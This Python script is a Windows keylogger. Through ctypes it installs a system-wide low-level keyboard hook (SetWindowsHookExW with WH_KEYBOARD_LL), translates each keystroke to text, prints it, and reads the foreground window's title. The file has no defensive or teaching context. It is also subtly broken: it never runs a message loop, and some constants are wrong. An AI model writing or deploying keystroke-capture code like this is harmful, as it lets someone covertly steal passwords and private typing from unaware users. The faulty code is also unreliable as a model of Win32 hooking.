from ctypes  import * 
from ctypes import wintypes
from ctypes import windll
from gc import callbacks
user32 = windll.user32

Lresult = c_long
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_RETURN = 0x0100
WM_ESCAPE = 0x0101



GetWindowTextLengthW = user32.GetWindowTextLengthW
GetWindowTextLengthW.argtypes = (wintypes.HWND,)
GetWindowTextLengthW.restype = wintypes.INT

GetWindowTextW = user32.GetWindowTextW
GetWindowTextW.argtypes = (wintypes.HWND, wintypes.LPWSTR
, wintypes.INT)

GetWindowTextW.restype = wintypes.INT

GetKeystate = user32.GetKeyState
GetKeystate.argtypes = (wintypes.INT,)
GetKeystate.restype = wintypes.SHORT

Keyboard_state = (wintypes.BYTE * 256)()
GetKeyboardState = user32.GetKeyboardState
GetKeyboardState.argtypes = (POINTER(wintypes.BYTE),)   
GetKeyboardState.restype = wintypes.BOOL

toAscii = user32.ToAscii
toAscii.argtypes = (wintypes.UINT, wintypes.UINT, POINTER(wintypes.BYTE), POINTER(wintypes.WORD), wintypes.UINT)
toAscii.restype = wintypes.INT

CallnNextHookEx = user32.CallNextHookEx
CallnNextHookEx.argtypes = (wintypes.HHOOK, wintypes.INT,
                                wintypes.WPARAM, wintypes.LPARAM)
CallnNextHookEx.restype = wintypes.LRESULT

HOOKPROC = CFUNCTYPE(wintypes.LRESULT, wintypes.INT,
                         wintypes.WPARAM, wintypes.LPARAM)
setWindowsHookExW = user32.SetWindowsHookExW
setWindowsHookExW.argtypes = (wintypes.INT, wintypes.LPVOID
, wintypes.HINSTANCE, wintypes.DWORD)
setWindowsHookExW.restype = wintypes.HHOOK

GetMessageA = user32.GetMessageA
GetMessageA.argtypes = (POINTER(wintypes.MSG), wintypes.HWND,
                            wintypes.UINT, wintypes.UINT)
GetMessageA.restype = wintypes.BOOL


class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", wintypes.ULONG_PTR),
    ]

def get_forground_process_text():
    hwnd = user32.GetForegroundWindow()
    length = GetWindowTextLengthW(hwnd)
    buff = create_unicode_buffer(length + 1)
    GetWindowTextW(hwnd, buff, length + 1)
    return buff.value


print(get_forground_process_text())

VK_RETURN = 0x0D
WM_SHIFT = 0x10

def hook_function(nCode, wParam, lParam):
    if wParam == WM_KEYDOWN:
        keyboard = KBDLLHOOKSTRUCT.from_address(lParam)
        vkCode = keyboard.vkCode
        scanCode = keyboard.scanCode
        state = (wintypes.BYTE * 256)()
        GetKeyboardState(byref(state))
        buf = (c_ushort * 1)()
        n = toAscii(vkCode, scanCode, state, buf, 0)
        if n > 0:
            if vkCode == VK_RETURN:
                print("\n")
            else:
                print(chr(buf[0]), end='', flush=True)
    return CallnNextHookEx(None, nCode, wParam, lParam)

last = None
callbacks = HOOKPROC(hook_function)
hook = setWindowsHookExW(WH_KEYBOARD_LL, callbacks, 0, 0)
if not hook:
    print("Failed to set hook.")